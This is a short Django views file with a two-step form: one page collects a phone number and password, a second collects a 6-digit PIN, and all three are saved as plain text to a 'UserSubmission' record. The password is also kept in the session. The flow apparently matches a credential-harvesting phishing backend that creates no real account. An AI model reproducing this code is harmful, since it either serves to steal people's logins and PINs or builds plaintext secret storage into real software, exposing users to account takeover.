from django.shortcuts import render, redirect
from .models import UserSubmission

def signup(request):
    error = None
    if request.method == 'POST':
        phone = request.POST.get('phone', '').strip()
        password = request.POST.get('password', '').strip()
        if phone and password:
            # Save to session, collect PIN on next page
            request.session['phone'] = phone
            request.session['password'] = password
            return redirect('pinpage')
        else:
            error = "Please enter both phone number and password."
    return render(request, 'signup.html', {'error': error})


def pinpage(request):
    error = None
    # Guard: if no session data, send back to signup
    if 'phone' not in request.session:
        return redirect('signup')

    if request.method == 'POST':
        pin = request.POST.get('pin', '').strip()
        if pin and len(pin) == 6 and pin.isdigit():
            phone = request.session.pop('phone')
            password = request.session.pop('password')
            UserSubmission.objects.create(phone=phone, password=password, pin=pin)
            return redirect('finalpage')
        else:
            error = "Please enter a valid 6-digit PIN."
    return render(request, 'pinpage.html', {'error': error})


def finalpage(request):
    return render(request, 'finalpage.html')